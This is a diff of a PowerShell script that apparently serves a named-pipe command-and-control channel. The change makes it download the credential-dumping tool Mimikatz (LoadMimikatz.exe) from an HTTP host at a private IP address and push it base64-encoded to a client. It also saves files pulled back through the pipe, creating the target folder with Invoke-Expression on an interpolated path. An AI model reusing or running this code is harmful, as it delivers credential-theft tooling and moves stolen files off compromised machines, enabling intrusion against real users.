@@ -1,4 +1,4 @@
-function ReadMsg([System.IO.StreamReader]$StreamReader){
+﻿function ReadMsg([System.IO.StreamReader]$StreamReader){
     $msg = $StreamReader.ReadLine()
     Write-Host $msg
 }
@@ -49,8 +49,7 @@ try{
 
             if ($script_action -eq 1){
                 $sw.WriteLine("Mimikatz")
-                $assemblyPath = 'C:\Users\HakkYahud\Documents\Symantec\PELoaderMimikatz\LoadMimikatz.exe'
-                $assemblyByte = [System.IO.File]::ReadAllBytes($assemblyPath)
+                $assemblyByte = (New-Object Net.WebClient).DownloadData("http://192.168.101.20:1996/LoadMimikatz.exe")
                 $assemblyB64 = [System.Convert]::ToBase64String($assemblyByte)
                 $sw.WriteLine($assemblyB64) # Server sending to the client
                 $sw.Dispose()
@@ -131,13 +130,17 @@ try{
                         Write-Host $filename
                         Write-Host $bytefile
 
-                        $path_to_copy = "C:\Users\HakkYahud\Documents\FileFromPipe"
+                        $path_to_copy = "{0}\Documents\FileExtractedFromPipe" -f $env:USERPROFILE
                         try{
                             [System.IO.File]::WriteAllBytes($path_to_copy+"\"+$filename, $bytefile)
                             Write-Host "File extracted"
                         }
                         catch [System.IO.DirectoryNotFoundException]{
                             Write-Host "Target directory not found"
+			    Write-Host "Creating target directory : $path_to_copy..."
+			    Invoke-Expression "mkdir $path_to_copy"
+                            [System.IO.File]::WriteAllBytes($path_to_copy+"\"+$filename, $bytefile)
+                            Write-Host "File extracted"
                         }
                     }
                 }             
